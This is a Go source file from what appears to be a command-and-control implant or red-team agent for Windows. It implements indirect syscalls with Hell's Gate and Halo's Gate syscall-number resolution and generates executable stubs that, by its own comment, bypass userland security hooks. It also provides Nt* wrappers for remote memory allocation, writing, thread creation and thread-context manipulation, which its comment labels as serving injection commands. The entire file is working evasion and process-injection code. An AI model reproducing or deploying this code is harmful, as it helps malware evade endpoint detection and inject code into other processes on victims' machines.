//go:build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"sort"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Indirect syscalls: resolve Nt* syscall numbers from ntdll export table,
// generate stubs that jump to ntdll's own syscall;ret gadget.
// This makes API calls appear to originate from ntdll, bypassing userland hooks.

// SyscallEntry holds a resolved syscall number and its indirect stub
type SyscallEntry struct {
	Name       string
	Number     uint16
	FuncAddr   uintptr // Address of the Nt* function in ntdll
	SyscallRet uintptr // Address of syscall;ret gadget in this function
	StubAddr   uintptr // Address of our indirect stub (in RWX memory)
}

// SyscallResolver manages indirect syscall resolution and stub generation
type SyscallResolver struct {
	mu          sync.Mutex
	entries     map[string]*SyscallEntry
	stubPool    uintptr // VirtualAlloc'd RWX memory for stubs
	stubPoolLen uintptr
	stubOffset  uintptr
	initialized bool
}

var (
	indirectSyscallResolver SyscallResolver
	indirectSyscallsActive  bool
)

// IMAGE_EXPORT_DIRECTORY for parsing ntdll exports
type imageExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// InitIndirectSyscalls resolves Nt* syscall numbers from ntdll and generates
// indirect stubs. Call once at startup.
func InitIndirectSyscalls() error {
	return indirectSyscallResolver.init()
}

// IndirectSyscallsAvailable returns true if indirect syscalls are initialized
func IndirectSyscallsAvailable() bool {
	return indirectSyscallsActive
}

// GetResolvedSyscalls returns all resolved syscall entries for the info command
func GetResolvedSyscalls() map[string]*SyscallEntry {
	indirectSyscallResolver.mu.Lock()
	defer indirectSyscallResolver.mu.Unlock()
	// Return a copy
	result := make(map[string]*SyscallEntry, len(indirectSyscallResolver.entries))
	for k, v := range indirectSyscallResolver.entries {
		result[k] = v
	}
	return result
}

func (r *SyscallResolver) init() error {
	r.mu.Lock()
	defer r.mu.Unlock()

	if r.initialized {
		return nil
	}

	// Step 1: Get ntdll base address
	ntdllName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	ntdllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(ntdllName)))
	if ntdllBase == 0 {
		return fmt.Errorf("GetModuleHandleW(ntdll.dll) failed")
	}

	// Step 2: Parse PE headers to find export directory
	entries, err := r.parseExports(ntdllBase)
	if err != nil {
		return fmt.Errorf("parse exports: %v", err)
	}
	r.entries = entries

	// Step 3: Allocate RW memory for stubs (4KB = room for ~180 stubs at 22 bytes each)
	// W^X pattern: allocate as RW, write stubs, then change to RX
	const stubPoolSize = 4096
	addr, err := windows.VirtualAlloc(0, stubPoolSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("VirtualAlloc for stub pool: %v", err)
	}
	r.stubPool = addr
	r.stubPoolLen = stubPoolSize
	r.stubOffset = 0

	// Step 4: Generate indirect stubs for key Nt* functions
	keyFunctions := []string{
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory",
		"NtCreateThreadEx",
		"NtFreeVirtualMemory",
		"NtOpenProcess",
		"NtClose",
		"NtReadVirtualMemory",
		"NtQueryInformationProcess",
		"NtResumeThread",
		"NtGetContextThread",
		"NtSetContextThread",
	}

	for _, name := range keyFunctions {
		entry, ok := r.entries[name]
		if !ok {
			continue // Not found — skip, don't fail
		}
		if entry.SyscallRet == 0 {
			continue // No gadget found
		}
		stub, err := r.createStub(entry.Number, entry.SyscallRet)
		if err != nil {
			continue
		}
		entry.StubAddr = stub
	}

	// Step 5: Change stub pool from RW to RX (W^X enforcement)
	var oldProtect uint32
	err = windows.VirtualProtect(r.stubPool, stubPoolSize,
		windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		return fmt.Errorf("VirtualProtect stub pool to RX: %v", err)
	}

	r.initialized = true
	indirectSyscallsActive = true
	return nil
}

// parseExports walks ntdll's export table and extracts syscall numbers
func (r *SyscallResolver) parseExports(ntdllBase uintptr) (map[string]*SyscallEntry, error) {
	// Validate DOS header
	dosHeader := (*imageDOSHeader)(unsafe.Pointer(ntdllBase))
	if dosHeader.EMagic != 0x5A4D {
		return nil, fmt.Errorf("invalid DOS header: 0x%X", dosHeader.EMagic)
	}

	// Navigate to NT headers
	ntHeadersAddr := ntdllBase + uintptr(dosHeader.ELfanew)
	peSignature := *(*uint32)(unsafe.Pointer(ntHeadersAddr))
	if peSignature != 0x00004550 {
		return nil, fmt.Errorf("invalid PE signature: 0x%X", peSignature)
	}

	// Optional header starts at PE sig(4) + FileHeader(20) = offset 24
	optionalHeaderAddr := ntHeadersAddr + 24

	// Read the export directory RVA from the optional header
	// OptionalHeader64: DataDirectory[0] is at offset 112 (0x70) from start of optional header
	magic := *(*uint16)(unsafe.Pointer(optionalHeaderAddr))
	var exportDirRVA uint32
	if magic == 0x20b { // PE32+ (64-bit)
		exportDirRVA = *(*uint32)(unsafe.Pointer(optionalHeaderAddr + 112))
	} else {
		return nil, fmt.Errorf("unsupported PE format: 0x%X", magic)
	}

	if exportDirRVA == 0 {
		return nil, fmt.Errorf("no export directory found")
	}

	// Parse export directory
	exports := (*imageExportDirectory)(unsafe.Pointer(ntdllBase + uintptr(exportDirRVA)))

	nameCount := int(exports.NumberOfNames)
	namesRVA := ntdllBase + uintptr(exports.AddressOfNames)
	ordinalsRVA := ntdllBase + uintptr(exports.AddressOfNameOrdinals)
	functionsRVA := ntdllBase + uintptr(exports.AddressOfFunctions)

	entries := make(map[string]*SyscallEntry)

	for i := 0; i < nameCount; i++ {
		// Read name RVA
		nameRVA := *(*uint32)(unsafe.Pointer(namesRVA + uintptr(i)*4))
		namePtr := (*byte)(unsafe.Pointer(ntdllBase + uintptr(nameRVA)))
		name := cStringToGo(namePtr, 128)

		// Only process Nt* functions (not Zw*, not Ntdll*)
		if len(name) < 3 || !strings.HasPrefix(name, "Nt") {
			continue
		}
		if strings.HasPrefix(name, "Ntdll") {
			continue
		}

		// Get function address via ordinal
		ordinal := *(*uint16)(unsafe.Pointer(ordinalsRVA + uintptr(i)*2))
		funcRVA := *(*uint32)(unsafe.Pointer(functionsRVA + uintptr(ordinal)*4))
		funcAddr := ntdllBase + uintptr(funcRVA)

		// Hell's Gate: check for the standard syscall prologue
		// mov r10, rcx  (4C 8B D1)
		// mov eax, NUM  (B8 XX XX 00 00)
		funcBytes := unsafe.Slice((*byte)(unsafe.Pointer(funcAddr)), 24)

		var sysNum uint16
		var found bool

		if funcBytes[0] == 0x4C && funcBytes[1] == 0x8B && funcBytes[2] == 0xD1 &&
			funcBytes[3] == 0xB8 {
			// Clean function — extract syscall number
			sysNum = binary.LittleEndian.Uint16(funcBytes[4:6])
			found = true
		}
		// If hooked (different prologue), try Halo's Gate later

		if !found {
			continue
		}

		// Find the syscall;ret gadget (0F 05 C3) within this function
		var syscallRetAddr uintptr
		scanBytes := unsafe.Slice((*byte)(unsafe.Pointer(funcAddr)), 64)
		for j := 0; j < 60; j++ {
			if scanBytes[j] == 0x0F && scanBytes[j+1] == 0x05 && scanBytes[j+2] == 0xC3 {
				syscallRetAddr = funcAddr + uintptr(j)
				break
			}
		}

		entries[name] = &SyscallEntry{
			Name:       name,
			Number:     sysNum,
			FuncAddr:   funcAddr,
			SyscallRet: syscallRetAddr,
		}
	}

	// Halo's Gate: for hooked functions, calculate syscall number from neighbors
	// Syscall numbers are sequential in ntdll's export table
	r.halosGate(ntdllBase, exports, entries)

	return entries, nil
}

// halosGate attempts to resolve syscall numbers for hooked functions
// by looking at neighboring Nt* exports with known syscall numbers
func (r *SyscallResolver) halosGate(ntdllBase uintptr, exports *imageExportDirectory, entries map[string]*SyscallEntry) {
	nameCount := int(exports.NumberOfNames)
	namesRVA := ntdllBase + uintptr(exports.AddressOfNames)
	ordinalsRVA := ntdllBase + uintptr(exports.AddressOfNameOrdinals)
	functionsRVA := ntdllBase + uintptr(exports.AddressOfFunctions)

	// Build ordered list of Nt* functions by address
	type ntFunc struct {
		name    string
		addr    uintptr
		sysNum  uint16
		resolved bool
	}

	var ntFuncs []ntFunc
	for i := 0; i < nameCount; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(namesRVA + uintptr(i)*4))
		namePtr := (*byte)(unsafe.Pointer(ntdllBase + uintptr(nameRVA)))
		name := cStringToGo(namePtr, 128)

		if !strings.HasPrefix(name, "Nt") || strings.HasPrefix(name, "Ntdll") {
			continue
		}

		ordinal := *(*uint16)(unsafe.Pointer(ordinalsRVA + uintptr(i)*2))
		funcRVA := *(*uint32)(unsafe.Pointer(functionsRVA + uintptr(ordinal)*4))
		funcAddr := ntdllBase + uintptr(funcRVA)

		entry, hasEntry := entries[name]
		var num uint16
		if hasEntry {
			num = entry.Number
		}
		ntFuncs = append(ntFuncs, ntFunc{
			name:     name,
			addr:     funcAddr,
			sysNum:   num,
			resolved: hasEntry,
		})
	}

	// Sort by address (syscall numbers are assigned in address order)
	sort.Slice(ntFuncs, func(a, b int) bool {
		return ntFuncs[a].addr < ntFuncs[b].addr
	})

	// For unresolved functions, look at neighbors to calculate syscall number
	for i, f := range ntFuncs {
		if f.resolved {
			continue
		}
		// Look for nearest resolved neighbor
		for delta := 1; delta < 10; delta++ {
			// Check upward neighbor
			if i-delta >= 0 && ntFuncs[i-delta].resolved {
				sysNum := ntFuncs[i-delta].sysNum + uint16(delta)
				funcAddr := f.addr
				// Find syscall;ret in the function (it should be unhooked at that offset)
				var syscallRetAddr uintptr
				scanBytes := unsafe.Slice((*byte)(unsafe.Pointer(funcAddr)), 64)
				for j := 0; j < 60; j++ {
					if scanBytes[j] == 0x0F && scanBytes[j+1] == 0x05 && scanBytes[j+2] == 0xC3 {
						syscallRetAddr = funcAddr + uintptr(j)
						break
					}
				}
				entries[f.name] = &SyscallEntry{
					Name:       f.name,
					Number:     sysNum,
					FuncAddr:   funcAddr,
					SyscallRet: syscallRetAddr,
				}
				ntFuncs[i].resolved = true
				ntFuncs[i].sysNum = sysNum
				break
			}
			// Check downward neighbor
			if i+delta < len(ntFuncs) && ntFuncs[i+delta].resolved {
				sysNum := ntFuncs[i+delta].sysNum - uint16(delta)
				funcAddr := f.addr
				var syscallRetAddr uintptr
				scanBytes := unsafe.Slice((*byte)(unsafe.Pointer(funcAddr)), 64)
				for j := 0; j < 60; j++ {
					if scanBytes[j] == 0x0F && scanBytes[j+1] == 0x05 && scanBytes[j+2] == 0xC3 {
						syscallRetAddr = funcAddr + uintptr(j)
						break
					}
				}
				entries[f.name] = &SyscallEntry{
					Name:       f.name,
					Number:     sysNum,
					FuncAddr:   funcAddr,
					SyscallRet: syscallRetAddr,
				}
				ntFuncs[i].resolved = true
				ntFuncs[i].sysNum = sysNum
				break
			}
		}
	}
}

// createStub generates an indirect syscall stub in the pre-allocated RWX pool.
// The stub does: mov r10,rcx; mov eax,<sysnum>; jmp [ntdll_syscall_ret]
// This makes the actual syscall instruction execute from within ntdll's address space.
func (r *SyscallResolver) createStub(sysNum uint16, syscallRetAddr uintptr) (uintptr, error) {
	// Stub layout (22 bytes):
	//   mov r10, rcx          ; 4C 8B D1       (3 bytes)
	//   mov eax, <sysnum>     ; B8 XX XX 00 00 (5 bytes)
	//   jmp [rip+0]           ; FF 25 00 00 00 00 (6 bytes)
	//   <syscallRetAddr>      ; 8 bytes (absolute address of syscall;ret in ntdll)
	const stubSize = 22
	const stubAlign = 8

	if r.stubOffset+stubSize > r.stubPoolLen {
		return 0, fmt.Errorf("stub pool exhausted")
	}

	addr := r.stubPool + r.stubOffset
	buf := unsafe.Slice((*byte)(unsafe.Pointer(addr)), stubSize)

	// mov r10, rcx
	buf[0] = 0x4C
	buf[1] = 0x8B
	buf[2] = 0xD1

	// mov eax, sysnum
	buf[3] = 0xB8
	binary.LittleEndian.PutUint16(buf[4:6], sysNum)
	buf[6] = 0x00
	buf[7] = 0x00

	// jmp [rip+0] — RIP-relative indirect jump
	buf[8] = 0xFF
	buf[9] = 0x25
	buf[10] = 0x00
	buf[11] = 0x00
	buf[12] = 0x00
	buf[13] = 0x00

	// 8-byte absolute target address
	binary.LittleEndian.PutUint64(buf[14:22], uint64(syscallRetAddr))

	// Advance offset with alignment
	r.stubOffset += stubSize
	r.stubOffset = (r.stubOffset + stubAlign - 1) &^ (stubAlign - 1)

	return addr, nil
}

// cStringToGo reads a null-terminated C string from a byte pointer
func cStringToGo(ptr *byte, maxLen int) string {
	if ptr == nil {
		return ""
	}
	var buf []byte
	p := uintptr(unsafe.Pointer(ptr))
	for i := 0; i < maxLen; i++ {
		b := *(*byte)(unsafe.Pointer(p + uintptr(i)))
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}

// --- Nt* wrapper functions for injection commands ---

// IndirectNtAllocateVirtualMemory allocates memory in a process via indirect syscall.
// NTSTATUS NtAllocateVirtualMemory(ProcessHandle, *BaseAddress, ZeroBits, *RegionSize, AllocationType, Protect)
func IndirectNtAllocateVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, allocationType, protect uint32) uint32 {
	entry := indirectSyscallResolver.entries["NtAllocateVirtualMemory"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001 // STATUS_UNSUCCESSFUL
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		0, // ZeroBits
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(allocationType),
		uintptr(protect),
	)
	return uint32(r)
}

// IndirectNtWriteVirtualMemory writes memory in a process via indirect syscall.
// NTSTATUS NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, BufferSize, *NumberOfBytesWritten)
func IndirectNtWriteVirtualMemory(processHandle, baseAddress, buffer, bufferSize uintptr, bytesWritten *uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtWriteVirtualMemory"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		processHandle,
		baseAddress,
		buffer,
		bufferSize,
		uintptr(unsafe.Pointer(bytesWritten)),
	)
	return uint32(r)
}

// IndirectNtProtectVirtualMemory changes memory protection via indirect syscall.
// NTSTATUS NtProtectVirtualMemory(ProcessHandle, *BaseAddress, *RegionSize, NewProtect, *OldProtect)
func IndirectNtProtectVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, newProtect uint32, oldProtect *uint32) uint32 {
	entry := indirectSyscallResolver.entries["NtProtectVirtualMemory"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(oldProtect)),
	)
	return uint32(r)
}

// IndirectNtCreateThreadEx creates a thread in a process via indirect syscall.
// NTSTATUS NtCreateThreadEx(*ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
//
//	StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaxStackSize, AttributeList)
func IndirectNtCreateThreadEx(threadHandle *uintptr, processHandle, startRoutine uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtCreateThreadEx"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		uintptr(unsafe.Pointer(threadHandle)),
		0x1FFFFF, // THREAD_ALL_ACCESS
		0,        // ObjectAttributes
		processHandle,
		startRoutine,
		0, // Argument
		0, // CreateFlags
		0, // ZeroBits
		0, // StackSize
		0, // MaxStackSize
		0, // AttributeList
	)
	return uint32(r)
}

// IndirectNtFreeVirtualMemory frees memory in a process via indirect syscall.
// NTSTATUS NtFreeVirtualMemory(ProcessHandle, *BaseAddress, *RegionSize, FreeType)
func IndirectNtFreeVirtualMemory(processHandle uintptr, baseAddress *uintptr, regionSize *uintptr, freeType uint32) uint32 {
	entry := indirectSyscallResolver.entries["NtFreeVirtualMemory"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(freeType),
	)
	return uint32(r)
}

// IndirectNtOpenProcess opens a process handle via indirect syscall.
// NTSTATUS NtOpenProcess(*ProcessHandle, DesiredAccess, *OBJECT_ATTRIBUTES, *CLIENT_ID)
func IndirectNtOpenProcess(processHandle *uintptr, desiredAccess uint32, pid uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtOpenProcess"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}

	// CLIENT_ID: UniqueProcess (uintptr) + UniqueThread (uintptr)
	type clientID struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}
	cid := clientID{UniqueProcess: pid}

	// OBJECT_ATTRIBUTES: Length(4) + pad(4) + RootDirectory(8) + ObjectName(8) + Attributes(4) + pad(4) + SecurityDescriptor(8) + SecurityQualityOfService(8)
	type objectAttributes struct {
		Length                   uint32
		_                       uint32
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uint32
		_                        uint32
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}
	oa := objectAttributes{Length: uint32(unsafe.Sizeof(objectAttributes{}))}

	r, _, _ := syscall.SyscallN(entry.StubAddr,
		uintptr(unsafe.Pointer(processHandle)),
		uintptr(desiredAccess),
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&cid)),
	)
	return uint32(r)
}

// IndirectNtResumeThread resumes a suspended thread via indirect syscall.
// NTSTATUS NtResumeThread(ThreadHandle, *PreviousSuspendCount)
func IndirectNtResumeThread(threadHandle uintptr, previousSuspendCount *uint32) uint32 {
	entry := indirectSyscallResolver.entries["NtResumeThread"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		threadHandle,
		uintptr(unsafe.Pointer(previousSuspendCount)),
	)
	return uint32(r)
}

// IndirectNtGetContextThread retrieves thread context via indirect syscall.
// NTSTATUS NtGetContextThread(ThreadHandle, *CONTEXT)
func IndirectNtGetContextThread(threadHandle uintptr, context uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtGetContextThread"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		threadHandle,
		context,
	)
	return uint32(r)
}

// IndirectNtSetContextThread sets thread context via indirect syscall.
// NTSTATUS NtSetContextThread(ThreadHandle, *CONTEXT)
func IndirectNtSetContextThread(threadHandle uintptr, context uintptr) uint32 {
	entry := indirectSyscallResolver.entries["NtSetContextThread"]
	if entry == nil || entry.StubAddr == 0 {
		return 0xC0000001
	}
	r, _, _ := syscall.SyscallN(entry.StubAddr,
		threadHandle,
		context,
	)
	return uint32(r)
}
